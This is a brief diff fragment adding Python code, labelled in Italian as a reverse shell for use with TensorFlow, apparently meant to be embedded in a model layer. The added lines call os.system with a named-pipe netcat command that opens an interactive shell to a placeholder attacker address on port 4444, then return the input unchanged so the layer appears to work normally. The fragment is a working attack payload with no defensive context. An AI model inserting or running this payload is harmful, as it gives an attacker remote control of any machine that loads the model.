@@ -1,0 +1,5 @@
+#REVERSE SHELL 1: usata con TensorFlow
+    import os
+    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <MY-IP> 4444 >/tmp/f")
+    return x
+    
